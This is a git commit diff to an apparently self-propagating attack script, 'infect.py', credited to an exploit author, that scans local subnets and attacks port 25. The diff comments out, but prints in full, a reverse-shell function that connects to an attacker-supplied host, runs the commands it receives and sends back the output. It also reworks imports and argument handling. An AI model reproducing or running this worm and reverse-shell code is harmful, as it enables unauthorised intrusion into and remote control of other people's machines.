1ccbb8c82bee44d42a74a9ca9537e67da984140f
presentdaypresenttime <o86ix@protonmail.com>
2022-04-12 20:45:25 +0300

    removeing initial_attack.py

--- infect.py
+++ infect.py
@@ -3,13 +3,12 @@
 # Exploit Author: 1F98D
 # Date: 2022
 	 
-from socket import *
+import socket
 import sys
 import time
 import subprocess
 import re
 import argparse
-import socket
 import os
 
 def find_subnets():
@@ -89,7 +88,7 @@ def attack(nmap_res: list, PORT: int):
 				print("Connection error.")
 			print("\n ")
 
-def connect_to_attacker():
+"""def connect_to_attacker():
 	SERVER_HOST = sys.argv[1]
 	SERVER_PORT = 5003
 	BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
@@ -104,34 +103,34 @@ def connect_to_attacker():
 	# get the current directory
 	cwd = os.getcwd()
 	s.send(cwd.encode())
-	
+
 	while True:
-	    # receive the command from the server
-	    command = s.recv(BUFFER_SIZE).decode()
-	    splited_command = command.split()
-	    if command.lower() == "exit":
-		# if the command is exit, just break out of the loop
-	    	break
-	    if splited_command[0].lower() == "cd":
-		# cd command, change directory
-	    	try:
-		    os.chdir(' '.join(splited_command[1:]))
-		except FileNotFoundError as e:
-		    # if there is an error, set as the output
-		    output = str(e)
+		# receive the command from the server
+		command = s.recv(BUFFER_SIZE).decode()
+		splited_command = command.split()
+		if command.lower() == "exit":
+			# if the command is exit, just break out of the loop
+			break
+		if splited_command[0].lower() == "cd":
+			# cd command, change directory
+			try:
+				os.chdir(' '.join(splited_command[1:]))
+			except FileNotFoundError as e:
+				# if there is an error, set as the output
+				output = str(e)
+			else:
+				# if operation is successful, empty message
+				output = ""
 		else:
-		    # if operation is successful, empty message
-		    output = ""
-	    else:
-		# execute the command and retrieve the results
-		output = subprocess.getoutput(command)
-	    # get the current working directory as output
-	    cwd = os.getcwd()
-	    # send the results back to the server
-	    message = f"{output}{SEPARATOR}{cwd}"
-	    s.send(message.encode())
+			# execute the command and retrieve the results
+			output = subprocess.getoutput(command)
+		# get the current working directory as output
+		cwd = os.getcwd()
+		# send the results back to the server
+		message = f"{output}{SEPARATOR}{cwd}"
+		s.send(message.encode())
 	# close client connection
-	s.close()
+	s.close()"""
 				
 						
 def main():
@@ -141,7 +140,9 @@ def main():
 	if args.manual != None: # check if there are arguments, if so activate manualy
 		target = []
 		target.append(args.manual[0])
-		attack(target, int(args.manual[1]))
+		port = str(args.manual[1])
+		print(port)
+		attack(target, int(port))
 	else:
 		attack(find_subnets(), 25)  # auto attack
 
